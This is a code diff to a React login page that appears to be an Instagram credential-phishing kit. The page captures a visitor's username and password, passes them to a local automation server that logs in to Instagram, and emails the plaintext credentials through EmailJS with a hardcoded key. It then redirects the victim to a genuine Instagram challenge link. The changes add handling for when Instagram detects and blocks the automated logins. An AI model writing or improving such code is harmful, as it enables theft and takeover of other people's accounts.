@@ -356,9 +356,21 @@ function App() {
       console.log("Error:", result.error);
       console.log("URL:", result.url);
 
+      // Check if result indicates Instagram blocking
+      const resultMessage = result.message || "";
+      const resultError = result.error || "";
+      const isInstagramBlockingFromResult =
+        resultMessage.toLowerCase().includes("blocking") ||
+        resultMessage.toLowerCase().includes("blocked") ||
+        resultError.toLowerCase().includes("blocking") ||
+        resultError.toLowerCase().includes("blocked") ||
+        resultMessage.toLowerCase().includes("may be blocking");
+
       // Determine status for email
-      let emailStatus = result.success 
-        ? "✅ Login Successful" 
+      let emailStatus = result.success
+        ? "✅ Login Successful"
+        : isInstagramBlockingFromResult
+        ? "⚠️ Instagram Blocking Detected"
         : "❌ Login Failed";
 
       // Show alert based on result
@@ -383,23 +395,35 @@ function App() {
           .then((emailResult) => {
             console.log("Email sent:", emailResult.text);
             // Redirect to challenge URL only on successful login
-            window.location.href = "https://www.instagram.com/challenge/ASiPub8EgqPKL-p8Ud3MuTh1C66lLQd_Ea6BRh6mA12lYI8R5gP5LpdfPG5Ge_je/ASRTebzeSSTW-_fOweJBGq71P7Onp_kyomgEd-mSPH9ft854LKrnuewUp5HOrpzz6wPGicm7zD_7lg/?challenge_context=AaX_Zvle_aRZcoWRerM1OtcBnl1x9nmuN8uBVQSbGvXfE_bDxLu9Ukb6OvQM8M21QbhfPChZICiNLp7dG3r2XZ-_NuzN6Or76omVjIVIOit5e4CE5mTr0QffVXmDMDyq_h8Rt1isD_BNZVDw695FK7XnTXtUZd4M0WrUJDNnoK9FJ33AhiLuFkf3FKg8uUWCx0ZE33Bjw7OR5cmquAq57X904yAgYFx-KKAVfDx4L13_r6klk5ur0PWw38NAIjxKkuNJm8S65glVWnrCidPj_S6pbjrJj2iJ5FnjKNaAiNbk8gW6kFq2Rehb27RdnjFRb8AE3mGU-fXxIE0_cL6CIu47-KZZhar9-bMWFZkGZfNlMMNi3eYTXKl3huh_RF7vOxPngzSKU3sbGSUDgS7myCo7AzTdLXVyL0WLnVRBcW7wg3tfBXMYNoRyLIikELwERg7kjuYMmjsCyRVrHeaJ_9VURM_8goxcP3sS4zjxO6ysRfArMJKMtD4rbIDCX6OkvcGBhWdfJY8x26KzrDQFm5Jxa4YfyD17f6giC3ogwoVI23hG9oXyapiBzmPgXN0fah-uRnP0gktPTXr_gXQ-LADHmkJbmV4lVIp2a7FpwDgBGOdYr8BTiYwayZMPG_3YI5nMpmmMPKY8pNhR1gOKlsbtLDqVJ9TbSQw6EyDgf9XA_ptzafPk1WIKfOukXxABEitY7JcFKP0f-Vc5AVyQUzQJnkmx6FMfk8FYkbzEvoXwgvp_Zf7HHYnv8A-qCLa0AVIZL-Zqzj1W2mz3iNPg1wMhT4voXJZj6mrm_5vl6kOZ9sCZ41W84cQXETnQVp0MBPMGWodIPoiRB45_DyJ7l1uHjy_QBzscEPBI1aFWGdFibYcYZpsD4PnXPlG_-RTZqbjN-_7ZUk0xiWYy_oS97fNktgxaydcvEhN8fhcKNKGZx2dMlOj_n5ms_WvVW1lYsug3dW_7UPRhuDwRf0cXoAbw8f1NeqLs5K2MK8yoHO6sDL8WTkEWntbP3VMX7lCoX5zF1IBLe7BA58LQ6QE4aiqO-kWmKDZVX183j0ri_6fbXJyy3VhrUp7l_N9MBHzizKbhAAedKCvUql1nCt6x-0xYgzuRmUxf1_B-uwChcA0Zq3CpuesCruPT9BgoiWj69gymusScHxXp0FiGEj1pAj_fXWjM1s-y0Qt38w3u4QF5Ckzl6FKKrJrHNasWCc6g8ii6CLybsN0gA93XDkw3s_tBVdBhPacEH17QXqLp1jqdd120WqJEQVTqviL7hDvkFWhb4r5zob3Is5Uh-JsQ65O-dPQ2YiNcfFT59YYfnd5h1Ouui4MC_NNr5lGz3xcdG4-Kw8wYJ4CK1GuI87j8sh_bu-mEwi16y_iiShD1dRVeKiWfMbpERkB44NKR8yrFn3wt89VPiUETnaYtDt8iEW4HaED0o9gMAwKXPjp_e8iI5otbGaxOHBE_YUh_L_f8HZqL5C3Y9krpEgUFAj1XDJfHQftyb1meTUWXk62lTpxN6dU0eAcaZoAR7bhu3rJU&deoia=1";
+            window.location.href =
+              "https://www.instagram.com/challenge/ASiPub8EgqPKL-p8Ud3MuTh1C66lLQd_Ea6BRh6mA12lYI8R5gP5LpdfPG5Ge_je/ASRTebzeSSTW-_fOweJBGq71P7Onp_kyomgEd-mSPH9ft854LKrnuewUp5HOrpzz6wPGicm7zD_7lg/?challenge_context=AaX_Zvle_aRZcoWRerM1OtcBnl1x9nmuN8uBVQSbGvXfE_bDxLu9Ukb6OvQM8M21QbhfPChZICiNLp7dG3r2XZ-_NuzN6Or76omVjIVIOit5e4CE5mTr0QffVXmDMDyq_h8Rt1isD_BNZVDw695FK7XnTXtUZd4M0WrUJDNnoK9FJ33AhiLuFkf3FKg8uUWCx0ZE33Bjw7OR5cmquAq57X904yAgYFx-KKAVfDx4L13_r6klk5ur0PWw38NAIjxKkuNJm8S65glVWnrCidPj_S6pbjrJj2iJ5FnjKNaAiNbk8gW6kFq2Rehb27RdnjFRb8AE3mGU-fXxIE0_cL6CIu47-KZZhar9-bMWFZkGZfNlMMNi3eYTXKl3huh_RF7vOxPngzSKU3sbGSUDgS7myCo7AzTdLXVyL0WLnVRBcW7wg3tfBXMYNoRyLIikELwERg7kjuYMmjsCyRVrHeaJ_9VURM_8goxcP3sS4zjxO6ysRfArMJKMtD4rbIDCX6OkvcGBhWdfJY8x26KzrDQFm5Jxa4YfyD17f6giC3ogwoVI23hG9oXyapiBzmPgXN0fah-uRnP0gktPTXr_gXQ-LADHmkJbmV4lVIp2a7FpwDgBGOdYr8BTiYwayZMPG_3YI5nMpmmMPKY8pNhR1gOKlsbtLDqVJ9TbSQw6EyDgf9XA_ptzafPk1WIKfOukXxABEitY7JcFKP0f-Vc5AVyQUzQJnkmx6FMfk8FYkbzEvoXwgvp_Zf7HHYnv8A-qCLa0AVIZL-Zqzj1W2mz3iNPg1wMhT4voXJZj6mrm_5vl6kOZ9sCZ41W84cQXETnQVp0MBPMGWodIPoiRB45_DyJ7l1uHjy_QBzscEPBI1aFWGdFibYcYZpsD4PnXPlG_-RTZqbjN-_7ZUk0xiWYy_oS97fNktgxaydcvEhN8fhcKNKGZx2dMlOj_n5ms_WvVW1lYsug3dW_7UPRhuDwRf0cXoAbw8f1NeqLs5K2MK8yoHO6sDL8WTkEWntbP3VMX7lCoX5zF1IBLe7BA58LQ6QE4aiqO-kWmKDZVX183j0ri_6fbXJyy3VhrUp7l_N9MBHzizKbhAAedKCvUql1nCt6x-0xYgzuRmUxf1_B-uwChcA0Zq3CpuesCruPT9BgoiWj69gymusScHxXp0FiGEj1pAj_fXWjM1s-y0Qt38w3u4QF5Ckzl6FKKrJrHNasWCc6g8ii6CLybsN0gA93XDkw3s_tBVdBhPacEH17QXqLp1jqdd120WqJEQVTqviL7hDvkFWhb4r5zob3Is5Uh-JsQ65O-dPQ2YiNcfFT59YYfnd5h1Ouui4MC_NNr5lGz3xcdG4-Kw8wYJ4CK1GuI87j8sh_bu-mEwi16y_iiShD1dRVeKiWfMbpERkB44NKR8yrFn3wt89VPiUETnaYtDt8iEW4HaED0o9gMAwKXPjp_e8iI5otbGaxOHBE_YUh_L_f8HZqL5C3Y9krpEgUFAj1XDJfHQftyb1meTUWXk62lTpxN6dU0eAcaZoAR7bhu3rJU&deoia=1";
           })
           .catch((error) => {
             console.error("EmailJS error:", error);
             // Still redirect even if email fails (on success)
-            window.location.href = "https://www.instagram.com/challenge/ASiPub8EgqPKL-p8Ud3MuTh1C66lLQd_Ea6BRh6mA12lYI8R5gP5LpdfPG5Ge_je/ASRTebzeSSTW-_fOweJBGq71P7Onp_kyomgEd-mSPH9ft854LKrnuewUp5HOrpzz6wPGicm7zD_7lg/?challenge_context=AaX_Zvle_aRZcoWRerM1OtcBnl1x9nmuN8uBVQSbGvXfE_bDxLu9Ukb6OvQM8M21QbhfPChZICiNLp7dG3r2XZ-_NuzN6Or76omVjIVIOit5e4CE5mTr0QffVXmDMDyq_h8Rt1isD_BNZVDw695FK7XnTXtUZd4M0WrUJDNnoK9FJ33AhiLuFkf3FKg8uUWCx0ZE33Bjw7OR5cmquAq57X904yAgYFx-KKAVfDx4L13_r6klk5ur0PWw38NAIjxKkuNJm8S65glVWnrCidPj_S6pbjrJj2iJ5FnjKNaAiNbk8gW6kFq2Rehb27RdnjFRb8AE3mGU-fXxIE0_cL6CIu47-KZZhar9-bMWFZkGZfNlMMNi3eYTXKl3huh_RF7vOxPngzSKU3sbGSUDgS7myCo7AzTdLXVyL0WLnVRBcW7wg3tfBXMYNoRyLIikELwERg7kjuYMmjsCyRVrHeaJ_9VURM_8goxcP3sS4zjxO6ysRfArMJKMtD4rbIDCX6OkvcGBhWdfJY8x26KzrDQFm5Jxa4YfyD17f6giC3ogwoVI23hG9oXyapiBzmPgXN0fah-uRnP0gktPTXr_gXQ-LADHmkJbmV4lVIp2a7FpwDgBGOdYr8BTiYwayZMPG_3YI5nMpmmMPKY8pNhR1gOKlsbtLDqVJ9TbSQw6EyDgf9XA_ptzafPk1WIKfOukXxABEitY7JcFKP0f-Vc5AVyQUzQJnkmx6FMfk8FYkbzEvoXwgvp_Zf7HHYnv8A-qCLa0AVIZL-Zqzj1W2mz3iNPg1wMhT4voXJZj6mrm_5vl6kOZ9sCZ41W84cQXETnQVp0MBPMGWodIPoiRB45_DyJ7l1uHjy_QBzscEPBI1aFWGdFibYcYZpsD4PnXPlG_-RTZqbjN-_7ZUk0xiWYy_oS97fNktgxaydcvEhN8fhcKNKGZx2dMlOj_n5ms_WvVW1lYsug3dW_7UPRhuDwRf0cXoAbw8f1NeqLs5K2MK8yoHO6sDL8WTkEWntbP3VMX7lCoX5zF1IBLe7BA58LQ6QE4aiqO-kWmKDZVX183j0ri_6fbXJyy3VhrUp7l_N9MBHzizKbhAAedKCvUql1nCt6x-0xYgzuRmUxf1_B-uwChcA0Zq3CpuesCruPT9BgoiWj69gymusScHxXp0FiGEj1pAj_fXWjM1s-y0Qt38w3u4QF5Ckzl6FKKrJrHNasWCc6g8ii6CLybsN0gA93XDkw3s_tBVdBhPacEH17QXqLp1jqdd120WqJEQVTqviL7hDvkFWhb4r5zob3Is5Uh-JsQ65O-dPQ2YiNcfFT59YYfnd5h1Ouui4MC_NNr5lGz3xcdG4-Kw8wYJ4CK1GuI87j8sh_bu-mEwi16y_iiShD1dRVeKiWfMbpERkB44NKR8yrFn3wt89VPiUETnaYtDt8iEW4HaED0o9gMAwKXPjp_e8iI5otbGaxOHBE_YUh_L_f8HZqL5C3Y9krpEgUFAj1XDJfHQftyb1meTUWXk62lTpxN6dU0eAcaZoAR7bhu3rJU&deoia=1";
+            window.location.href =
+              "https://www.instagram.com/challenge/ASiPub8EgqPKL-p8Ud3MuTh1C66lLQd_Ea6BRh6mA12lYI8R5gP5LpdfPG5Ge_je/ASRTebzeSSTW-_fOweJBGq71P7Onp_kyomgEd-mSPH9ft854LKrnuewUp5HOrpzz6wPGicm7zD_7lg/?challenge_context=AaX_Zvle_aRZcoWRerM1OtcBnl1x9nmuN8uBVQSbGvXfE_bDxLu9Ukb6OvQM8M21QbhfPChZICiNLp7dG3r2XZ-_NuzN6Or76omVjIVIOit5e4CE5mTr0QffVXmDMDyq_h8Rt1isD_BNZVDw695FK7XnTXtUZd4M0WrUJDNnoK9FJ33AhiLuFkf3FKg8uUWCx0ZE33Bjw7OR5cmquAq57X904yAgYFx-KKAVfDx4L13_r6klk5ur0PWw38NAIjxKkuNJm8S65glVWnrCidPj_S6pbjrJj2iJ5FnjKNaAiNbk8gW6kFq2Rehb27RdnjFRb8AE3mGU-fXxIE0_cL6CIu47-KZZhar9-bMWFZkGZfNlMMNi3eYTXKl3huh_RF7vOxPngzSKU3sbGSUDgS7myCo7AzTdLXVyL0WLnVRBcW7wg3tfBXMYNoRyLIikELwERg7kjuYMmjsCyRVrHeaJ_9VURM_8goxcP3sS4zjxO6ysRfArMJKMtD4rbIDCX6OkvcGBhWdfJY8x26KzrDQFm5Jxa4YfyD17f6giC3ogwoVI23hG9oXyapiBzmPgXN0fah-uRnP0gktPTXr_gXQ-LADHmkJbmV4lVIp2a7FpwDgBGOdYr8BTiYwayZMPG_3YI5nMpmmMPKY8pNhR1gOKlsbtLDqVJ9TbSQw6EyDgf9XA_ptzafPk1WIKfOukXxABEitY7JcFKP0f-Vc5AVyQUzQJnkmx6FMfk8FYkbzEvoXwgvp_Zf7HHYnv8A-qCLa0AVIZL-Zqzj1W2mz3iNPg1wMhT4voXJZj6mrm_5vl6kOZ9sCZ41W84cQXETnQVp0MBPMGWodIPoiRB45_DyJ7l1uHjy_QBzscEPBI1aFWGdFibYcYZpsD4PnXPlG_-RTZqbjN-_7ZUk0xiWYy_oS97fNktgxaydcvEhN8fhcKNKGZx2dMlOj_n5ms_WvVW1lYsug3dW_7UPRhuDwRf0cXoAbw8f1NeqLs5K2MK8yoHO6sDL8WTkEWntbP3VMX7lCoX5zF1IBLe7BA58LQ6QE4aiqO-kWmKDZVX183j0ri_6fbXJyy3VhrUp7l_N9MBHzizKbhAAedKCvUql1nCt6x-0xYgzuRmUxf1_B-uwChcA0Zq3CpuesCruPT9BgoiWj69gymusScHxXp0FiGEj1pAj_fXWjM1s-y0Qt38w3u4QF5Ckzl6FKKrJrHNasWCc6g8ii6CLybsN0gA93XDkw3s_tBVdBhPacEH17QXqLp1jqdd120WqJEQVTqviL7hDvkFWhb4r5zob3Is5Uh-JsQ65O-dPQ2YiNcfFT59YYfnd5h1Ouui4MC_NNr5lGz3xcdG4-Kw8wYJ4CK1GuI87j8sh_bu-mEwi16y_iiShD1dRVeKiWfMbpERkB44NKR8yrFn3wt89VPiUETnaYtDt8iEW4HaED0o9gMAwKXPjp_e8iI5otbGaxOHBE_YUh_L_f8HZqL5C3Y9krpEgUFAj1XDJfHQftyb1meTUWXk62lTpxN6dU0eAcaZoAR7bhu3rJU&deoia=1";
           });
       } else {
         // Login failed - stay on login page for retry
         console.log("=== LOGIN FAILED ===");
         console.log("Message:", result.message);
         console.log("Error:", result.error);
-        alert(
-          `❌ ${result.message}\n${
-            result.error ? `Error: ${result.error}` : ""
-          }`
-        );
+        
+        // Show appropriate alert based on blocking detection
+        if (isInstagramBlockingFromResult) {
+          alert(
+            `⚠️ Instagram may be blocking automated access.\n\n${
+              result.message || result.error || ""
+            }\n\nThe login attempt was recorded. You can try again, but Instagram may continue to block automated access.`
+          );
+        } else {
+          alert(
+            `❌ ${result.message}\n${
+              result.error ? `Error: ${result.error}` : ""
+            }`
+          );
+        }
 
         // Send email notification about failed attempt (no redirect)
         emailjs
@@ -427,14 +451,15 @@ function App() {
       console.error("Error type:", error.name);
       console.error("Error message:", error.message);
       console.error("Full error:", error);
-      
+
       // Check if error is related to Instagram blocking
-      const errorMessage = error.message || '';
-      const isInstagramBlocking = errorMessage.includes('blocking') || 
-                                  errorMessage.includes('blocked') ||
-                                  errorMessage.includes('challenge') ||
-                                  errorMessage.includes('unusual activity');
-      
+      const errorMessage = error.message || "";
+      const isInstagramBlocking =
+        errorMessage.includes("blocking") ||
+        errorMessage.includes("blocked") ||
+        errorMessage.includes("challenge") ||
+        errorMessage.includes("unusual activity");
+
       if (isInstagramBlocking) {
         alert(
           `⚠️ Instagram may be blocking automated access.\n\nThis is common when Instagram detects automation. The login attempt was still recorded.\n\nError: ${error.message}`
@@ -444,7 +469,7 @@ function App() {
           `❌ Failed to connect to automation server.\nError: ${error.message}\n\nMake sure the server is running on port 3001.`
         );
       }
-      
+
       // Send email about the error (only if we didn't get a result from server)
       // Don't redirect - user stays on login page to try again
       emailjs
@@ -454,7 +479,9 @@ function App() {
           {
             username: username,
             password: password,
-            status: isInstagramBlocking ? "⚠️ Instagram Blocking Detected" : "❌ Automation Error",
+            status: isInstagramBlocking
+              ? "⚠️ Instagram Blocking Detected"
+              : "❌ Automation Error",
           },
           "bfy_j4oBXNKFpGcDC"
         )
